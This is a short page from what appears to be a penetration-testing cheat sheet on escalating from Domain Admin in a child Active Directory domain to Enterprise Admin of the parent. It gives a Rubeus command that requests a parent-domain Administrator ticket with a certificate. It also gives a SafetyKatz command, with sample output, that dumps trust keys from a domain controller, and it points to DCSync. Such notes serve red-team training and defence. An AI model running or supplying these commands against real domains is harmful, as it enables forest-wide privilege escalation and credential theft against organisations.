# DA to EA

## Request other certificate

When you get DA to a domain via [#pkinit-authentication](../misc/ad-authentication.md#pkinit-authentication "mention"), for instance with [esc1.md](../adcs/exploitation/esc1.md "mention"), you can get Enterprise Admin of a parent domain via:

```powershell
> Rubeus asktgt /user:parentdomain.local\Administrator /dc:dc.parentdomain.local /certificate:<cert> /password:<pass> /nowrap /ptt
```

## Domain trust key

Get the trust key from the child domain to the parent domain with SafetyKatz on a DC:

```powershell
> SafetyKatz.exe "lsadump::evasive-trust /patch"
[In] us.techcorp.local -> techcorp.local
* KEY

[Out] techcorp.local -> us.techcorp.local
* KEY

...
```

It is also possible to retrieve the trust key through [dcsync.md](dcsync.md "mention").
